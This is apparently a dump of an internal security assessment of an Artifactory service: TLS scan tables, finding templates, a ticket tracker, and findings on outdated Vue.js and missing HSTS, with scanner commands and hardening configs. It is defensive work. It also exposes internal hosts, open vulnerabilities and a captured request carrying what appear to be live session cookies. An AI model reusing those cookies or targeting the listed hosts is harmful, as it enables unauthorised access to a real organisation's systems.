| 35.83.68.61   | artifactory-uw2.adobeitc.com | 443  | HIGH     | insecure_redirect    | Redirect to insecure URL: 'http://artifactory-uw2.adobeitc.com/ui/' |               |         |
| 35.83.68.61   | artifactory-uw2.adobeitc.com | 443  | LOW      | HSTS                 | not offered                                                         |               |         |
| 35.83.68.61   | artifactory-uw2.adobeitc.com | 443  | MEDIUM   | security_headers     | --                                                                  |               |         |
| 35.83.68.61   | artifactory-uw2.adobeitc.com | 443  | HIGH     | secure_client_renego | VULNERABLE, DoS threat                                              | CVE-2011-1473 | CWE-310 |
| 35.83.68.61   | artifactory-uw2.adobeitc.com | 443  | LOW      | LUCKY13              | potentially vulnerable, uses TLS CBC ciphers                        | CVE-2013-0169 | CWE-310 |
| 44.232.11.135 | artifactory-uw2.adobeitc.com | 443  | LOW      | cipherlist_AVERAGE   | offered                                                             |               | CWE-310 |
| 44.232.11.135 | artifactory-uw2.adobeitc.com | 443  | LOW      | OCSP_stapling        | not offered                                                         |               |         |
| 44.232.11.135 | artifactory-uw2.adobeitc.com | 443  | LOW      | DNS_CAArecord        | --                                                                  |               |         |
| 44.232.11.135 | artifactory-uw2.adobeitc.com | 443  | HIGH     | insecure_redirect    | Redirect to insecure URL: 'http://artifactory-uw2.adobeitc.com/ui/' |               |         |
| 44.232.11.135 | artifactory-uw2.adobeitc.com | 443  | LOW      | HSTS                 | not offered                                                         |               |         |
| 44.232.11.135 | artifactory-uw2.adobeitc.com | 443  | MEDIUM   | security_headers     | --                                                                  |               |         |
| 44.232.11.135 | artifactory-uw2.adobeitc.com | 443  | HIGH     | secure_client_renego | VULNERABLE, DoS threat                                              | CVE-2011-1473 | CWE-310 |
| 44.232.11.135 | artifactory-uw2.adobeitc.com | 443  | LOW      | LUCKY13              | potentially vulnerable, uses TLS CBC ciphers                        | CVE-2013-0169 | CWE-310 |
| 44.232.74.35  | artifactory-uw2.adobeitc.com | 443  | LOW      | cipherlist_AVERAGE   | offered                                                             |               | CWE-310 |
| 44.232.74.35  | artifactory-uw2.adobeitc.com | 443  | LOW      | OCSP_stapling        | not offered                                                         |               |         |
| 44.232.74.35  | artifactory-uw2.adobeitc.com | 443  | LOW      | DNS_CAArecord        | --                                                                  |               |         |
| 44.232.74.35  | artifactory-uw2.adobeitc.com | 443  | HIGH     | insecure_redirect    | Redirect to insecure URL: 'http://artifactory-uw2.adobeitc.com/ui/' |               |         |
| 44.232.74.35  | artifactory-uw2.adobeitc.com | 443  | LOW      | HSTS                 | not offered                                                         |               |         |
| 44.232.74.35  | artifactory-uw2.adobeitc.com | 443  | MEDIUM   | security_headers     | --                                                                  |               |         |
| 44.232.74.35  | artifactory-uw2.adobeitc.com | 443  | HIGH     | secure_client_renego | VULNERABLE, DoS threat                                              | CVE-2011-1473 | CWE-310 |
| 44.232.74.35  | artifactory-uw2.adobeitc.com | 443  | LOW      | LUCKY13              | potentially vulnerable, uses TLS CBC ciphers                        | CVE-2013-0169 | CWE-310 |
| 54.69.227.215 | artifactory-uw2.adobeitc.com | 443  | LOW      | cipherlist_AVERAGE   | offered                                                             |               | CWE-310 |
| 54.69.227.215 | artifactory-uw2.adobeitc.com | 443  | LOW      | OCSP_stapling        | not offered                                                         |               |         |
| 54.69.227.215 | artifactory-uw2.adobeitc.com | 443  | LOW      | DNS_CAArecord        | --                                                                  |               |         |
| 54.69.227.215 | artifactory-uw2.adobeitc.com | 443  | HIGH     | insecure_redirect    | Redirect to insecure URL: 'http://artifactory-uw2.adobeitc.com/ui/' |               |         |
| 54.69.227.215 | artifactory-uw2.adobeitc.com | 443  | LOW      | HSTS                 | not offered                                                         |               |         |
| 54.69.227.215 | artifactory-uw2.adobeitc.com | 443  | MEDIUM   | security_headers     | --                                                                  |               |         |
| 54.69.227.215 | artifactory-uw2.adobeitc.com | 443  | HIGH     | secure_client_renego | VULNERABLE, DoS threat                                              | CVE-2011-1473 | CWE-310 |
| 54.69.227.215 | artifactory-uw2.adobeitc.com | 443  | LOW      | LUCKY13              | potentially vulnerable, uses TLS CBC ciphers                        | CVE-2013-0169 | CWE-310 |
| 52.33.92.242  | artifactory-uw2.adobeitc.com | 443  | LOW      | cipherlist_AVERAGE   | offered                                                             |               | CWE-310 |
| 52.33.92.242  | artifactory-uw2.adobeitc.com | 443  | LOW      | OCSP_stapling        | not offered                                                         |               |         |
| 52.33.92.242  | artifactory-uw2.adobeitc.com | 443  | LOW      | DNS_CAArecord        | --                                                                  |               |         |
| 52.33.92.242  | artifactory-uw2.adobeitc.com | 443  | HIGH     | insecure_redirect    | Redirect to insecure URL: 'http://artifactory-uw2.adobeitc.com/ui/' |               |         |
| 52.33.92.242  | artifactory-uw2.adobeitc.com | 443  | LOW      | HSTS                 | not offered                                                         |               |         |
| 52.33.92.242  | artifactory-uw2.adobeitc.com | 443  | MEDIUM   | security_headers     | --                                                                  |               |         |
| 52.33.92.242  | artifactory-uw2.adobeitc.com | 443  | HIGH     | secure_client_renego | VULNERABLE, DoS threat                                              | CVE-2011-1473 | CWE-310 |
| 52.33.92.242  | artifactory-uw2.adobeitc.com | 443  | LOW      | LUCKY13              | potentially vulnerable, uses TLS CBC ciphers                        | CVE-2013-0169 | CWE-310 |
| 35.163.52.97  | artifactory-uw2.adobeitc.com | 443  | LOW      | cipherlist_AVERAGE   | offered                                                             |               | CWE-310 |
| 35.163.52.97  | artifactory-uw2.adobeitc.com | 443  | LOW      | OCSP_stapling        | not offered                                                         |               |         |
| 35.163.52.97  | artifactory-uw2.adobeitc.com | 443  | LOW      | DNS_CAArecord        | --                                                                  |               |         |
| 35.163.52.97  | artifactory-uw2.adobeitc.com | 443  | HIGH     | insecure_redirect    | Redirect to insecure URL: 'http://artifactory-uw2.adobeitc.com/ui/' |               |         |
| 35.163.52.97  | artifactory-uw2.adobeitc.com | 443  | LOW      | HSTS                 | not offered                                                         |               |         |
| 35.163.52.97  | artifactory-uw2.adobeitc.com | 443  | MEDIUM   | security_headers     | --                                                                  |               |         |
| 35.163.52.97  | artifactory-uw2.adobeitc.com | 443  | HIGH     | secure_client_renego | VULNERABLE, DoS threat                                              | CVE-2011-1473 | CWE-310 |
| 35.163.52.97  | artifactory-uw2.adobeitc.com | 443  | LOW      | LUCKY13              | potentially vulnerable, uses TLS CBC ciphers                        | CVE-2013-0169 | CWE-310 |

# Replicate Finding:
1. Download and install [testssl.sh](https://testssl.sh/)
2. Run the following command: `testssl.sh --append --assume-http --full --parallel --sneaky -oA "testssl_output" IMPACTED_URI_GOES_HERE`
3. Review output

# Mitigation/Remediation:
We recommend the following:

1. **cipherlist_AVERAGE**  
   Update the server configuration to use strong ciphers, such as AES-256-GCM or ChaCha20-Poly1305, and disable weak ciphers.  
   **Sample Code**:  
   ```bash
   ssl_ciphers HIGH:!aNULL:!MD5:!3DES;
   ```

2. **DNS_CAArecord**  
   Implement a DNS CAA record to specify which CAs are authorized to issue certificates for your domain.  
   **Sample Code**:  
   ```bash
   example.com.  CAA 0 issue "letsencrypt.org"
   ```

3. **HSTS**  
   Enable HSTS by adding the `Strict-Transport-Security` header to your server’s configuration.  
   **Sample Code**:  
   ```bash
   add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
   ```

4. **insecure_redirect**  
   Implement a secure 301 or 308 permanent redirect from HTTP to HTTPS, and ensure that all HTTP traffic is redirected before any content is served.  
   **Sample Code**:  
   ```bash
   return 301 https://$host$request_uri;
   ```

5. **LUCKY13**  
   Use a TLS library that has implemented constant-time padding to mitigate the LUCKY13 vulnerability. If upgrading is not possible, consider switching to a GCM mode of encryption.  

6. **OCSP_stapling**  
   Enable OCSP stapling in your server’s configuration to enhance certificate revocation checking.  
   **Sample Code**:  
   ```bash
   ssl_stapling on;
   ssl_stapling_verify on;
   ```

7. **secure_client_renego**  
   Disable client-initiated renegotiation in your TLS settings.  
   **Sample Code**:  
   ```bash
   ssl_renegotiation off;
   ```

8. **security_headers**  
   Implement the missing security headers by adding them to your server’s response headers.  
   **Sample Code**:  
   ```bash
   add_header X-Frame-Options "DENY";
   add_header X-Content-Type-Options "nosniff";
   add_header Content-Security-Policy "default-src 'self'";
   ```

**Be advised, the above patch should be applied to all other system(s) running the impacted software that are managed by the team.**

# References: 
1. https://breachattack.com/
2. https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html
3. https://csrc.nist.gov/pubs/sp/800/52/r2/final
4. https://datatracker.ietf.org/doc/html/rfc5280
5. https://datatracker.ietf.org/doc/html/rfc6960
6. https://datatracker.ietf.org/doc/html/rfc7457
7. https://datatracker.ietf.org/doc/html/rfc8996
8. https://docs.aws.amazon.com/acm/latest/userguide/managed-renewal.html
9. https://letsencrypt.org/docs/caa/
10. https://letsencrypt.org/docs/integration-guide/
11. https://owasp.org/www-project-secure-headers/#http-strict-transport-security
12. https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption
13. https://ssl-config.mozilla.org/
14. https://sweet32.info/
15. https://wiki.mozilla.org/Security/Server_Side_TLS
16. https://www.rfc-editor.org/rfc/rfc8996
1. **cipherlist_AVERAGE**  
   - [Cipher Configuration Guide](https://mozilla.github.io/server-side-tls/ssl-config-generator/)

2. **DNS_CAArecord**  
   - [CAA Best Practices](https://sslmate.com/labs/caa/)

3. **HSTS**  
   - [HSTS Documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security)

4. **insecure_redirect**  
   - [Secure Redirection Guide](https://www.nginx.com/blog/http-to-https/)

5. **LUCKY13**  
   - [LUCKY13 Whitepaper](https://www.isg.rhul.ac.uk/tls/Lucky13.html)

6. **OCSP_stapling**  
   - [OCSP Stapling Guide](https://www.digicert.com/blog/ocsp-stapling-how-it-works)

7. **secure_client_renego**  
   - [Renegotiation Exploit Info](https://tools.ietf.org/html/rfc5746)

8. **security_headers**  
   - [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Findings/Draft/Artifactory Access - Security Cloud Review Template - High (7.1).md
---

# Risk: High (7.1)
**CVSS:3.1**`/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
Based on the risk, the SLA to fix the ticket is **N** days. The team must fix this issue by **DATE**, per Adobe's[Vulnerability Management Standard](https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Vulnerability-Management-Standard.pdf#page=2)

# Description:
While performing a cloud security assessment of `Artifactory`, we observed the noted `cloudVendor` account had `insert cloud misconfiguration`. Specifically, `explain vulnerability here`

# Impact:
If uncovered by an attacker...

# Affected Assets:
## Affected `cloudVendor` Account(s):
- arn:aws:lambda:us-east-2:123456789012:function:my-function
- principalSet://iam.googleapis.com/projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/POOL_ID/attribute.ATTRIBUTE_NAME/ATTRIBUTE_VALUE
- 

# Evidence:
Insert evidence here

# Replicate Finding:
1. Clone the impacted repo: `git clone git@git.corp.adobe.com:ORG/repo.git`
2. Navigate into the noted repo
3. Open the impacted file(s)
4. Got to impacted line

# Mitigation/Remediation:
We recommend...

For more information & context, please see the reference section below.

**Please ensure that the above patch is applied to all other services, applications, and/or systems running the affected software that are managed by the team.**

# References:
1. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Patch-Management-Standard.pdf
2. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Network-Security-Standard.pdf



---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Findings/Draft/Artifactory Access - Security Architecture Review Template - High (7.1).md
---

# Risk: High (7.1)
**CVSS:3.1**`/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
Based on the risk, the SLA to fix the ticket is **N** days. The team must fix this issue by **DATE**, per Adobe's[Vulnerability Management Standard](https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Vulnerability-Management-Standard.pdf#page=2)

# Description:
While performing a architectural security review of `Artifactory`, we observed the noted `App_Srv` had `insert TM finding`. Specifically, `explain vulnerability here`

# Impact:
If uncovered by an attacker...

# Affected Assets:
## Affected `cloudVendor` Account(s):
- arn:aws:lambda:us-east-2:123456789012:function:my-function
- principalSet://iam.googleapis.com/projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/POOL_ID/attribute.ATTRIBUTE_NAME/ATTRIBUTE_VALUE
- 

# Evidence:
Insert evidence here

# Replicate Finding:
1. Clone the impacted repo: `git clone git@git.corp.adobe.com:ORG/repo.git`
2. Navigate into the noted repo
3. Open the impacted file(s)
4. Got to impacted line

# Mitigation/Remediation:
We recommend...

For more information & context, please see the reference section below.

**Please ensure that the above patch is applied to all other services, applications, and/or systems running the affected software that are managed by the team.**

# References:
1. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Patch-Management-Standard.pdf
2. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Network-Security-Standard.pdf



---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Findings/Issues Tracker.md
---

Tickets identified will be tracked here
1. [Artifactory Access - Artifactory Anonymous Deployment - High (8.8)](https://jira.corp.adobe.com/browse/UDVT-2700)
2. [Artifactory Access - Artifactory User Enumeration Vulnerability - Medium (6.5)](https://jira.corp.adobe.com/browse/UDVT-2701)
3. [Artifactory Access - Inadequate Encryption Strength - TLS-SSL Security Misconfiguration & Weak Ciphers  - High (7.5)](https://jira.corp.adobe.com/browse/UDVT-2702)
4. [Artifactory Access - OpenSSH Vulnerability - High (7.8)](https://jira.corp.adobe.com/browse/UDVT-2703)

## 03-14-2025
1. [UDVT-3851 - Artifactory Access - Artifactory Anonymous Access - High (8.2)](https://jira.corp.adobe.com/browse/UDVT-3851)
2. [UDVT-3852 - Artifactory Access - Cross Site Request Forgery (XSRF) - Medium (6.3)](https://jira.corp.adobe.com/browse/UDVT-3852)
3. [UDVT-3853 - Artifactory Access - HSTS Security Misconfiguration - Medium (6.5)](https://jira.corp.adobe.com/browse/UDVT-3853)
4. [UDVT-3854 - Artifactory Access - Outdated Vulnerable Software - Dell EMC Open Manage Server Administrator - High (7.8)](https://jira.corp.adobe.com/browse/UDVT-3854)
5. [UDVT-3855 - Artifactory Access - Outdated Vulnerable Software - DOMPurify - Medium (6.1)](https://jira.corp.adobe.com/browse/UDVT-3855)
6. [UDVT-3856 - Artifactory Access - Outdated Vulnerable Software - JFrog Artifactory - Critical (9.3)](https://jira.corp.adobe.com/browse/UDVT-3856)
7. [UDVT-3857 - Artifactory Access - Outdated Vulnerable Software - Medium (4.8)](https://jira.corp.adobe.com/browse/UDVT-3857)
8. [UDVT-3858 - Artifactory Access - Outdated Vulnerable Software - nginx - High (7.8)](https://jira.corp.adobe.com/browse/UDVT-3858)
9. [UDVT-3859 - Artifactory Access - Outdated Vulnerable Software - Vue.js - Medium (4.8)](https://jira.corp.adobe.com/browse/UDVT-3859)


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Findings/Submitted/Artifactory Access - Outdated Vulnerable Software - Vue.js - Medium (4.8).md
---

# Risk: Medium (4.8)
`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N`

Based on the risk, the SLA to fix the ticket is **60** days. The team must fix this issue by **2024-10-06**, per Adobe's[Vulnerability Management Standard](https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Vulnerability-Management-Standard.pdf#page=2)

**NOTE: ** The score was derived from the highest vulnerability in the software dependency package. For a breakdown of each reach, please reference the spreadsheet in the evidence section.  

# Executive Summary
A medium security vulnerability has been identified in the Vue.js library (version 2.6.1) used by JFrog Artifactory. This vulnerability allows attackers to execute arbitrary JavaScript code in the context of the user's browser, potentially leading to data theft, session hijacking, and other malicious activities. Immediate action is required to mitigate this risk and protect the integrity of the software development lifecycle managed by Artifactory.

## Detailed Finding
While conducting a security review of `Artifactory Access`, we observed the noted web application used outdated 3P software with known vulnerabilities.  Specifically, the noted web application used Vue.js v2.6.1, which is susceptible Cross-Site Scripting (XSS). This vulnerability arises from improper input validation, allowing attackers to inject malicious scripts into web pages viewed by other users.

## Impact
Given the role of JFrog Artifactory in managing and distributing software artifacts, the impact of this vulnerability is significant. An attacker exploiting this XSS vulnerability could:
- Steal sensitive information, including authentication tokens and user credentials.
- Hijack user sessions, gaining unauthorized access to Artifactory repositories.
- Inject malicious code into artifacts, potentially compromising downstream applications and services.
- Disrupt the CI/CD pipeline, leading to delays and potential breaches in the software development lifecycle.
In this context, the vulnerability can be exploited through prototype pollution, where an attacker manipulates the prototype chain of certain properties like `Object.prototype.staticClass` or `Object.prototype.staticStyle`. This manipulation can lead to the execution of arbitrary JavaScript code, compromising the security of the application.

# Affected Assets:
## Affected Software:
- vue@2.6.1

## Affected Host(s):
- 10.50.227.143 (artifactory.corp.adobe.com) [443/tcp]

# Evidence:
## Curl:
```http
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.22.1
Date: Thu, 13 Mar 2025 18:28:17 GMT
Content-Type: text/html
Content-Length: 145
Location: https://artifactory.corp.adobe.com/ui/
Connection: keep-alive

HTTP/1.1 200 OK
Date: Thu, 13 Mar 2025 18:28:17 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 3029
Connection: keep-alive
Accept-Ranges: bytes
Cache-Control: max-age=604800000
Content-Security-Policy: script-src 'self' 'unsafe-eval'; font-src 'self' data:; base-uri 'self'; style-src 'self' 'unsafe-inline'; form-action 'self'; frame-ancestors 'self'
Etag: W/"bd5-18c5d74aa00"
Feature-Policy: geolocation 'none';microphone 'none';camera 'none';payment 'none'
Last-Modified: Tue, 12 Dec 2023 09:56:16 GMT
Referrer-Policy: no-referrer
Vary: Accept-Encoding
X-Content-Security-Policy: script-src 'self' 'unsafe-eval'; font-src 'self' data:; base-uri 'self'; style-src 'self' 'unsafe-inline'; form-action 'self'; frame-ancestors 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Webkit-Csp: script-src 'self' 'unsafe-eval'; font-src 'self' data:; base-uri 'self'; style-src 'self' 'unsafe-inline'; form-action 'self'; frame-ancestors 'self'
X-Xss-Protection: 1; mode=block
```

## testssl:
```csv
"banner_server","artifactory-uw2.adobeitc.com/35.161.24.87","443","INFO","nginx/1.20.2","",""
"banner_server","artifactory-uw2.adobeitc.com/35.164.234.86","443","INFO","nginx/1.20.2","",""
"banner_server","artifactory-uw2.adobeitc.com/35.83.68.61","443","INFO","nginx/1.20.2","",""
"banner_server","artifactory-uw2.adobeitc.com/44.224.138.44","443","INFO","nginx/1.20.2","",""
"banner_server","artifactory-uw2.adobeitc.com/44.232.11.135","443","INFO","nginx/1.20.2","",""
"banner_server","artifactory-uw2.adobeitc.com/44.232.74.35","443","INFO","nginx/1.20.2","",""
"banner_server","artifactory-uw2.adobeitc.com/52.89.174.215","443","INFO","nginx/1.20.2","",""
"banner_server","artifactory-uw2.adobeitc.com/54.69.227.215","443","INFO","nginx/1.20.2","",""
"banner_server","artifactory.corp.adobe.com/10.50.227.143","443","INFO","nginx/1.22.1","",""
"engine_problem","/","443","WARN","No engine or GOST support via engine with your /opt/homebrew/opt/openssl@3/bin/openssl","",""
```

# Replicate Finding:
1. Visit the impacted URL in your web browser
2. Run the following command: `nuclei -v -t custom -t cloud -t code -t dast -t dns -t file -t headless -t http -t javascript -t network -t passive -t ssl -t workflows -severity critical,high,medium,low,info -o nuclei_output.out https://artifactory.corp.adobe.com`
3. Alternative, run this command: `curl -IkLs "https://artifactory.corp.adobe.com/"`

# Mitigation/Remediation:
We recommend updating Vue.js to the latest version where this issue is resolved. Additionally, consider implementing the following steps:
1. **Update Vue.js:**
   ```bash
   npm install vue@latest
   ```
2. **Sanitize User Inputs:** Ensure all user inputs are properly sanitized and validated to prevent injection attacks.
3. **Content Security Policy (CSP):** Implement a robust CSP to restrict the sources from which scripts can be loaded.
4. **Regular Security Audits:** Conduct regular security audits and code reviews to identify and address potential vulnerabilities.

Lastly, we recommend hardening the system after patching and ensuring all installed software including the noted software are patched. For more details, please the references below!

**Be advised, the above patch should be applied to all other system(s) running the impacted software that are managed by the team.**

# References:
1. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Patch-Management-Standard.pdf
2. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Source_Code_Security_Standard.pdf
3. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Secure-Product-Lifecycle-Standard.pdf
4. [https://github.com/advisories/GHSA-5j4c-8p2g-v4jx](https://github.com/advisories/GHSA-5j4c-8p2g-v4jx)
5. [https://nvd.nist.gov/vuln/detail/CVE-2024-9506](https://nvd.nist.gov/vuln/detail/CVE-2024-9506)
6. https://nvd.nist.gov/vuln/detail/CVE-2024-6783
7. [https://github.com/vuejs/core](https://github.com/vuejs/core)
8. [https://www.herodevs.com/vulnerability-directory/cve-2024-9506](https://www.herodevs.com/vulnerability-directory/cve-2024-9506)
9. https://vuejs.org/guide/best-practices/security.html


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Findings/Submitted/Artifactory Access - HSTS  Security Misconfiguration - Medium (6.5).md
---

# Risk: Medium (6.5)
**CVSS Vector (CVSS:3.1):** /AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N

Based on the risk, the SLA to fix the ticket is **N** days. The team must fix this issue by **DATE**, per Adobe's[Vulnerability Management Standard](https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Vulnerability-Management-Standard.pdf#page=2)

# Description:
While perfoming a security assessment of `Artifactory Access`, we observed the noted web server is not enforcing HSTS, as defined by RFC 6797. HSTS is an optional response header that can be configured on the server to instruct the browser to only communicate via HTTPS. The lack of HSTS allows downgrade attacks, SSL-stripping man-in-the-middle attacks, and weakens cookie-hijacking protections. During testing, we did not observer a `Strict-Transport-Security` header in the server response.

# Impact:
If the web application mixes usage of HTTP and HTTPS, an attacker can manipulate pages in the unsecured area of the application. Alternatively, the attacker can change redirection targets in a manner that the switch to the secured page is not performed or done in a manner, that allows the attacker to remain between client and server. Lastly, if there is no HTTP server, an attacker in the same network could simulate an HTTP server and motivate the user to click on a prepared URL by a social engineering attack.

# Affected Assets:
## Affected Host(s):
```
https://artifactory.corp.adobe.com/
https://artifactory.corp.adobe.com//artifactory/ui/api/v1/ui/repodata
https://artifactory.corp.adobe.com//ui/api/v1/ui/repodata
https://artifactory.corp.adobe.com/artifactory/api/graphql
https://artifactory.corp.adobe.com/artifactory/api/repositories
https://artifactory.corp.adobe.com/artifactory/api/security/permissions/pypi-gentech-tools-release-local
https://artifactory.corp.adobe.com/artifactory/ui/repodata
https://artifactory.corp.adobe.com/ui/
https://artifactory.corp.adobe.com/ui/api/v1/access/mode
https://artifactory.corp.adobe.com/ui/api/v1/access/platform/config/login-dialog
https://artifactory.corp.adobe.com/ui/api/v1/access/plugins/user-plugin
https://artifactory.corp.adobe.com/ui/api/v1/auth/login/autoRedirectState
https://artifactory.corp.adobe.com/ui/api/v1/jfconnect/entitlements
https://artifactory.corp.adobe.com/ui/api/v1/mds/packages
https://artifactory.corp.adobe.com/ui/api/v1/system/auth/screen/footer
https://artifactory.corp.adobe.com/ui/api/v1/system/featuresConfig
https://artifactory.corp.adobe.com/ui/api/v1/system/status/nodes
https://artifactory.corp.adobe.com/ui/api/v1/ui/artifactsearch/pkg/availablePackages
https://artifactory.corp.adobe.com/ui/api/v1/ui/auth/current
https://artifactory.corp.adobe.com/ui/api/v1/ui/auth/login
https://artifactory.corp.adobe.com/ui/api/v1/ui/auth/loginRelatedData
https://artifactory.corp.adobe.com/ui/api/v1/ui/auth/logout
https://artifactory.corp.adobe.com/ui/api/v1/ui/home/widget/artifactCount
https://artifactory.corp.adobe.com/ui/api/v1/ui/oauth2/loginRequestPlatform
https://artifactory.corp.adobe.com/ui/api/v1/ui/repodata
https://artifactory.corp.adobe.com/ui/login/
```

# Evidence:
## Request
```bash
GET / HTTP/1.1
Host: artifactory.corp.adobe.com
Cookie: OptanonAlertBoxClosed=2024-06-03T20:31:46.671Z; OptanonConsent=groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1; kndctr_9E1005A551ED61CA0A490D45_AdobeOrg_consent=general%3Din; _cs_c=0; _scid=3f65d8ac-a3a6-4368-8f96-f4012d5a7b22; _tt_enable_cookie=1; _ttp=sqgXU6leYCmkBW6RFXtuOop67oT; s_ecid=MCMID%7C68252571855136552702238539336569704049; OptanonChoice=1; TID=-D8F91K5J-; _cs_id=591e9f62-6470-a78a-9818-190dd4bc93bc.1717446707.2.1717471150.1717471150.1.1751610707164.0; forterToken=e005d2fe98964904b73c7aa1bfef758a_1717536167029__UDF43-m4_13ck_; mbox=PC#68252571855136552702238539336569704049-hlOhwS.35_0#1780780969|session#79d4d75fda5e4eaeb0c60f0471ce1260#1717538029; apt.uid=AP-FESSAAK1LHWP-2-1717536170062-72318774.0.2.29cbcfd9-b13c-4ef6-aea7-31bb2c5eb992; kndctr_9E1005A551ED61CA0A490D45_AdobeOrg_identity=CiY2ODI1MjU3MTg1NTEzNjU1MjcwMjIzODUzOTMzNjU2OTcwNDA0OVISCPXxs%5F79MRABGAEqA09SMjAA8AGu7sXxiTI%3D; ab.storage.deviceId.c374d0d3-4249-4ff1-8a44-91b417c11c69=%7B%22g%22%3A%22d5e71a6f-244d-5b9a-400b-ad6367faf607%22%2C%22c%22%3A1717536175280%2C%22l%22%3A1720640961640%7D; ab.storage.userId.c374d0d3-4249-4ff1-8a44-91b417c11c69=%7B%22g%22%3A%22734F1E44665F722A0A495FDF%40AdobeID%22%2C%22c%22%3A1717536175267%2C%22l%22%3A1720640961640%7D; ab.storage.sessionId.c374d0d3-4249-4ff1-8a44-91b417c11c69=%7B%22g%22%3A%22b7a14380-2588-d9d8-030d-fb22bc820534%22%2C%22e%22%3A1720642763629%2C%22c%22%3A1720640961640%2C%22l%22%3A1720640963629%7D; _gcl_au=1.1.323665853.1725913028; _fbp=fb.1.1725913028184.683609351988360229; adcloud={%22_les_v%22:%22c%2Cy%2Cadobe.com%2C1725914828%22}; AMCV_9E1005A551ED61CA0A490D45%40AdobeOrg=-2121179033%7CMCMID%7C68252571855136552702238539336569704049%7CMCAID%7CNONE%7CMCOPTOUT-1725920228s%7CNONE%7CMCAAMLH-1726517828%7C9%7CMCAAMB-1726517828%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI%7CvVersion%7C5.3.0%7CMCIDTS%7C19976%7CMCCIDH%7C-1461582827%7CMCSYNCSOP%7C411-19983; _ScCbts=%5B%5D; _sctr=1%7C1725854400000; creative-cloud-theme=device; s_nr=1725913380695-Repeat; _uetvid=4ca0a38021e811efaf5e89cd846667fb; acomsis=1; AMCV_D6FAAFAD54CA9F560A4C98A5%40AdobeOrg=-637568504%7CMCMID%7C68252571855136552702238539336569704049%7CMCIDTS%7C19976%7CMCAAMLH-1726518181%7C9%7CMCAAMB-1726518181%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI%7CMCOPTOUT-1725920581s%7CNONE%7CMCSYNCSOP%7C411-19983%7CvVersion%7C5.1.1; _scid_r=ZZ0_Zdiso6ZmaNCW9AEtWnsi--69SMwwv_k6mw; kndctr_533E28D76436B6E40A495CBE_AdobeOrg_identity=CiY2ODI1MjU3MTg1NTEzNjU1MjcwMjIzODUzOTMzNjU2OTcwNDA0OVIQCJ3K78icMhgBKgNPUjIwA_AB6deH4J4y; aux_sid=AUWH0K8Ohy6CAk-bM-mrasnSB8lbkEWZibUC_ZE5BMM1LS1fNHEKlaUjW_0pW0IL4kG3IcHDtHg_5y45jJGxc_Do4xJvn4m4XpH_DzkqBvdon3783XCKVRyH6IaIAicyC3_Ml6kI_FI98IQ-qZZ-d55PfwhEL3eEkZz_0bLtEHLl7xsAl_71J4f0sPzimZFc54qOvHZTB6z7Nmzcpw_mdxd-BXfYNVdzQTWVss30BvVM60Hs_H192omjgmv5DLNEDFE8WhafSwqnuoH3VHg_5SUMSql7acY0eorQxCdES08urTyOf2epJGGfUWNHrlN3ebselv0GuAGVTW92SQ4v708drVh9XNDQo1O88AnMvcq8Ma9Wffi4u2HKoC9uKZtnOwUi0s7GmCTaiCFrT1b6spY2133ryCJZDEK8E5IUvQ3QlP5T5r7o19t8hS9eKQlJ7P2K3LnbiTSN_i61BqCq2vWvR0wdv5i_LMR_0DC2nB6lJ4zpkwlKeOImVvJ8ahXiMkyGEmrF5en0XoJTgAR7enhzbHoAdIEB_Hn8kiRXITg5EtlNnq6RXrcMfpyaU7__xihgku_eCt87nVeUv51XpQTwZReduTASbaOu7o1Bl1m5xjDWR91Y4eSzBthh04Jx69CuQQn1dWx8-oKUxz2xMe2jitLd2m_weut5UF-rchS-QQdhyokEmTVVwChNLsKyyFkEurDNcQuttDyH7fd1_Q5HuIfmw3n4m39xnA6VYFn08xVxUakpMoDHJjW2rXAAb1zbmZ3kL1k7WTJULCdjYSghpcHwBP4; fs_uid=#o-1X0HP2-na1#d4630d16-1a65-456b-a84e-7e634afedd55:e61eca23-5a06-4489-9b50-8eb18adaf1a4:1726254325051::3#2a2aa51a#/1757192057
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
